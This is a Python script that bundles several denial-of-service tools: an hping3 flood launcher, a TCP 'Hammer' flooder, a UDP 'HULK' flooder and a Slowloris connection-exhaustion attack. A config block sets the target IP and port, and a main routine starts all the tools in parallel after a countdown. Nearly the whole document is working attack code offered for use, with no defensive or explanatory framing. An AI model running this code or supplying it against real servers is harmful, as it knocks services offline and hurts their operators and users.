import subprocess
import signal
import atexit
import socket
import random
import logging
import time
import os
import multiprocessing as mp
from threading import Thread

"""
-------------------------------------------------
config.py
-------------------------------------------------
"""


class Config:
    def __init__(self):
        self.Platform = "win"

        self.ATKIPv4 = ""
        self.ATKPort = 445  # default 80

        self.HPING3 = False
        self.Hammer = True
        self.HULK = True
        self.SlowLoris = True

        self.waitTime = 5  # seconds
        self.printColor = False

        self.HPING3_PARAMETERS = [
            ("  ", 1e9, "--flood", "", 0),
            ("-0", 1e9, "--flood", "", 0),
            ("-1", 1e9, "--flood", "", 3),
            ("-2", 1e9, "--flood", "", 3),
        ]
        """
        (mode, data, freq, extra args, processes)
        Recommand to use the total number of processes equal to the number of CPU cores.
        """
        self.Hammer_PARAMETERS = {
            "threads": 50,
            "hits": 100,
        }

        self.SlowLoris_PARAMETERS = {
            "socket_count": 500,
            "sleeptime": 15
        }

        # ==============================================================================
        # DO NOT TOUCH !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        # ==============================================================================
        self.Platform1 = "win"
        self.Platform2 = "linux"

        if self.Platform == self.Platform1:
            # windows
            self.HPING3 = False
        if self.Platform == self.Platform2:
            # linux
            if self.printColor:
                print(
                    f'{Bcolors.WARNING} Make sure to be "sudo su" before executing this script. {Bcolors.ENDC}'
                )
            else:
                print("Make sure to be 'sudo su' before executing this script.")


class Bcolors:
    # https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


config = Config()

"""
-------------------------------------------------
hping3.py
-------------------------------------------------
"""


class DOS:
    def __init__(self, TARGETIPv4, parameters):
        self.startTime = time.time()
        self.responseTime = []
        self.PIDs = []
        self.ATKcommands = []
        self.TARGETIPv4 = TARGETIPv4
        self.ATKPARAMETERS = parameters

    def spawnATKprocess(self):
        for i, val in enumerate(self.ATKPARAMETERS):
            for j in range(val[4]):
                self.ATKcommands.append(
                    f"hping3 {val[0]} -d {val[1]} {val[2]} {val[3]} {self.TARGETIPv4} &"
                )
        self.length = len(self.ATKcommands)
        print(
            f"{Bcolors.OKGREEN}Start DDoS attack with {self.length} processes...{Bcolors.ENDC}"
        )
        for i, val in enumerate(self.ATKcommands):
            proc = subprocess.Popen(val, shell=True)
            self.PIDs.append(proc.pid)
        # register signal handler
        signal.signal(signal.SIGINT, self.killATKprocess)
        # register exit handler
        atexit.register(self.killATKprocess)
        #
        while True:
            time.sleep(1)

    def killATKprocess(self):
        print(f"{Bcolors.OKGREEN}\nStop DoS attack...{Bcolors.ENDC}")
        for i, val in enumerate(self.PIDs):
            os.kill(val, signal.SIGSTOP)
        print(f"{Bcolors.OKGREEN}Terminated {self.length} processes.{Bcolors.ENDC}")
        print(
            f"{Bcolors.OKGREEN}Total time: {int(time.time() - self.startTime)} seconds.{Bcolors.ENDC}"
        )


"""
-------------------------------------------------
hammering.py
-------------------------------------------------
"""


def hammering():
    host = config.ATKIPv4
    port = config.ATKPort
    speedPerRun = config.Hammer_PARAMETERS["hits"]
    threads = config.Hammer_PARAMETERS["threads"]
    ip = socket.gethostbyname(host)
    bytesToSend = random._urandom(2450)

    def goForDosThatThing():
        try:
            while True:
                dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    dosSocket.connect((ip, port))
                    for i in range(speedPerRun):
                        try:
                            dosSocket.send(
                                str.encode("GET ")
                                + bytesToSend
                                + str.encode(" HTTP/1.1 \r\n")
                            )
                            dosSocket.sendto(
                                str.encode("GET ")
                                + bytesToSend
                                + str.encode(" HTTP/1.1 \r\n"),
                                (ip, port),
                            )
                        except socket.error:
                            print("ERROR, Maybe the host is down?!?!")
                        except KeyboardInterrupt:
                            print("\r\n[-] Canceled by user")
                except socket.error:
                    print("ERROR, Maybe the host is down?!?!")
                except KeyboardInterrupt:
                    print("\r\n[-] Canceled by user")
                dosSocket.close()
        except KeyboardInterrupt:
            print("\r\n[-] Canceled by user")

    print(f" [+] Hammering server {host}")
    try:
        for i in range(threads):
            try:
                t = Thread(target=goForDosThatThing)
                t.start()
            except KeyboardInterrupt:
                print("\r\n[-] Canceled by user")
    except KeyboardInterrupt:
        print("\r\n[-] Canceled by user")


"""
-------------------------------------------------
hulk.py
-------------------------------------------------
"""


def hulk():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = config.ATKIPv4
    port = config.ATKPort
    print(f" [+] HULK is attacking server {ip}")
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print(" ")
        print("\n [-] Ctrl+C Detected.........Exiting")
        print(" [-] DDOS ATTACK STOPPED")
    input(" Enter To Exit")
    os.system("clear")
    print(" [-] Dr. Banner is tired...")


"""
-------------------------------------------------
slowloris.py
-------------------------------------------------
"""

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

list_of_sockets = []
user_agents = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect((ip, config.ATKPort))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = config.SlowLoris_PARAMETERS["socket_count"] - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(config.ATKIPv4)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

def slowloris():
    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = config.ATKIPv4
    # port = config.ATKPort
    socket_count = config.SlowLoris_PARAMETERS["socket_count"]
    sleeptime = config.SlowLoris_PARAMETERS["sleeptime"]
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", sleeptime)
        time.sleep(sleeptime)


"""
-------------------------------------------------
main.py
-------------------------------------------------
"""

if __name__ == "__main__":
    for i in range(config.waitTime):
        if config.printColor:
            print(
                f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
            )
        else:
            print(f"\n{5-i} seconds before attacking {config.ATKIPv4}....")
        time.sleep(1)

    if config.printColor:
        print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
    else:
        print(f"\nStarting DoS attack...")
    try:
        processes = 0
        if config.HPING3:
            dos = DOS(config.ATKIPv4, config.HPING3_PARAMETERS)
            p_hping3 = mp.Process(target=dos.spawnATKprocess)
            p_hping3.start()
            processes += 1
        if config.HULK:
            p_hulk = mp.Process(target=hulk)
            p_hulk.start()
            processes += 1
        if config.Hammer:
            p_hammer = mp.Process(target=hammering)
            p_hammer.start()
            processes += 1
        if config.SlowLoris:
            p_slowloris = mp.Process(target=slowloris)
            p_slowloris.start()
            processes += 1
        if processes == 0:
            if config.printColor:
                print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
            else:
                print(f"[-] No DoS tools selected.")
            exit(0)
    except KeyboardInterrupt:
        if config.printColor:
            print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
        else:
            print(f"[-] Canceled by user")
        if config.HPING3:
            p_hping3.terminate()
        if config.Hammer:
            p_hammer.terminate()
        if config.HULK:
            p_hulk.terminate()
        if config.SlowLoris:
            p_slowloris.terminate()

    if config.printColor:
        print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
    else:
        print(f"Started DoS attack.")